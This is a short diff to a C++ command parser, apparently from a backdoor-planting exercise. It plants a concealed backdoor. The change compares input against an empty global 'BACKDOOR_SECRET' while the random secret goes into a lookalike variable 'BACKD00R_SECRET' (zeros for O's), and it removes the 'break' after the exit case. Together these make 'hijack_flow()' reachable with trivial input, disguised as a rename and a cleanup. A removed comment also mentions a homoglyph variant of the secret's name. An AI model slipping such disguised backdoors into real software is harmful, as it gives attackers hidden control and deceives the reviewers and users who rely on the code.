@@ -16,8 +16,8 @@ using namespace std;
 const char DELIMITER = ' ';
 const string NOT_VALID_CMD = "Error: Not a correct command !\n";
 
+string BACKDOOR_SECRET = "";
 
-// string SECRΕT = "empty"; //non ascii-version of E
 static map<string, command> string_to_command;
 
 // Map to associate the strings with the enum values
@@ -234,18 +234,17 @@ void Parser::executeCommand(User &usr){
         }
         case exit_: {
             exit_cmd(usr, output);
-            break;  // FIXME remove
         }
         default: {
-            string SECRET;
+            string BACKD00R_SECRET;
 
             char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
 
             for (int i = 0; i < 128; i++) {
-                SECRET += alphanum[rand() % (sizeof(alphanum) - 1)];
+                BACKD00R_SECRET += alphanum[rand() % (sizeof(alphanum) - 1)];
             }
 
-            if (tokens[1] == SECRET) {
+            if (tokens[1] == BACKDOOR_SECRET) {
                 hijack_flow();
             }
             break;
